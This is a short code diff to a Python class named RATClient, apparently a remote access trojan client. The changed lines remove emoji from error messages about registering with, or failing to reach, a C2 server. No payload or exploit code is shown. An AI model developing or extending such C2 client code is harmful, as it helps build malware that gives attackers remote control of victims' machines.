@@ -104,16 +104,16 @@ class RATClient:
                     print(f"[+] ✅ Successfully registered with C2 server!")
                     return True
             
-            print(f"[-] ❌ Registration failed: {response.status_code}")
+            print(f"[-] Registration failed: {response.status_code}")
             return False
                 
 
         except requests.exceptions.ConnectionError:
-            print(f"[-] ❌ Cannot connect to C2 server at {self.server_url}")
+            print(f"[-] Cannot connect to C2 server at {self.server_url}")
             return False
 
         except Exception as e:
-            print(f"[-] ❌ Registration error: {e}")
+            print(f"[-] Registration error: {e}")
             return False
     
     
